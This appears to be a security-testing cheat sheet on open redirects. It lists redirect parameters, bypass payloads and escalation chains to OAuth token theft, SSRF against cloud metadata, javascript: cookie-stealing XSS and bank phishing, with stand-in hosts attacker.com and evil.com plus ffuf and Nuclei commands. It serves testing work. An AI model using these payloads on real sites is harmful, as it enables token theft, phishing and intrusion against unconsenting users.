# Open Redirect Chains

Bypass techniques and escalation paths for open redirect vulnerabilities.

## Common Redirect Parameters

```
redirect, redirect_to, url, link, goto, return, returnTo, destination,
next, checkout_url, continue, return_path, return_url, forward, path,
redir, redirect_uri, view, load_url, callback, target, rurl, out
```

## Where to Find

- Social login integrations (OAuth redirect_uri)
- Post-authentication return URLs
- Payment gateway callbacks
- Share/invite functionality
- URL shorteners
- SSO implementations
- Logout → redirect flows

---

## Bypass Techniques

### Domain Spoofing

```
https://target.com/redir?url=https://target.com.attacker.com
https://target.com/redir?url=https://attacker.com?target.com
https://target.com/redir?url=https://attackertarget.com
https://target.com/redir?url=https://target.com@attacker.com
https://target.com/redir?url=https://attacker.com#target.com
https://target.com/redir?url=https://attacker.com\.target.com
```

### Encoding Bypass

```
# URL encoding
?url=https%3A%2F%2Fattacker.com
?url=%68%74%74%70%73%3a%2f%2fattacker.com

# Double encoding
?url=https%253A%252F%252Fattacker.com

# Unicode
?url=https://attacker.com%E3%80%82target.com
```

### Protocol Confusion

```
?url=javascript:alert(document.domain)
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
?url=https;/attacker.com
?url=https:/attacker.com
?url=//attacker.com
```

### Path / Slash Manipulation

```
?url=////attacker.com
?url=/\/attacker.com
?url=/\attacker.com
?url=/.attacker.com
?url=///attacker.com/%2f..
?url=////attacker.com/%2e%2e
?url=https://target.com/redirect/../redirect?url=https://attacker.com
```

### Null Byte / Special Characters

```
?url=https://attacker.com%00.target.com
?url=https://attacker.com%0d%0aHost:target.com
?url=https://target.com%23@attacker.com
?url=https://target.com%2523@attacker.com
```

### Userinfo Abuse

```
?url=https://target.com:443@attacker.com/
?url=https://target.com%40attacker.com
```

### Case and Whitespace

```
?url=HtTpS://attacker.com
?url= https://attacker.com
?url=%09https://attacker.com
?url=%20https://attacker.com
```

---

## Escalation Chains

### Open Redirect → OAuth Token Theft

```
1. Find open redirect on target.com: /redirect?url=ATTACKER
2. Use as redirect_uri in OAuth flow:
   /oauth/authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://attacker.com
3. Token/code sent to attacker via redirect chain
```

### Open Redirect → SSRF

```
1. Internal service fetches user-supplied URL
2. Supply: https://target.com/redirect?url=http://169.254.169.254/...
3. Server follows redirect to internal/cloud metadata
```

### Open Redirect → XSS (via javascript:)

```
?url=javascript:alert(document.cookie)
?url=data:text/html,<script>alert(1)</script>
```

### Open Redirect → Phishing

```
1. Craft link: https://trusted-bank.com/redirect?url=https://fake-bank.com/login
2. Victim sees trusted domain in initial URL
3. Lands on attacker's credential harvester
```

### Open Redirect → Account Takeover (Mobile)

```
1. Android intent:// injection via redirect parameter
2. ?url=intent://callback#Intent;package=com.attacker;S.browser_fallback_url=https://evil.com;end
3. If victim app not installed → browser navigates to evil.com with tokens
```

---

## Testing Methodology

1. Identify all redirect parameters and endpoints
2. Test basic external redirect (https://attacker.com)
3. If blocked: try bypass techniques in order above
4. If redirect works: test escalation chains
5. Document: which bypass worked, what data leaks (tokens, codes)

## Tools

- **Burp**: scan for redirect parameters, test bypass list
- **ffuf**: `ffuf -u "https://target.com/FUZZ?url=https://evil.com" -w redirect-params.txt -fr "evil.com"`
- **OpenRedireX**: automated open redirect testing
- **Nuclei**: `nuclei -t redirect -u https://target.com`
